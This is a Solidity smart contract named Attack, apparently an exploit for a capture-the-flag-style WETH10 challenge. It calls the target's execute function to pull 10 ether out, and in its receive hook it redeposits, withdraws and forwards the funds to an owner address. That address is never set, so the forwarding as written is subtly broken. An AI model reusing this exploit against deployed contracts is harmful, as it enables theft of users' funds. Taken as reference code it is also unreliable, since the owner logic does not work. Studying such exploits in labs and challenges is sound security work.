//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface WETH10 {
    function withdraw(uint256 wad) external;
    function execute(address receiver, uint256 amount, bytes calldata data) external;
}

contract Attack {

    address weth;
    address owner;

    constructor(address _weth) {
        weth = _weth;
    }

    receive() external payable {
        (bool success,) = payable(weth).call{value: msg.value}("");
        if(success) {
            WETH10(weth).withdraw(msg.value);
            payable(owner).call{value: msg.value}("0x");
        }
    }

    function safeGuardEth() public {
        WETH10(weth).execute(address(this), 10 ether, "");
    }

    fallback() external payable {
    }


}

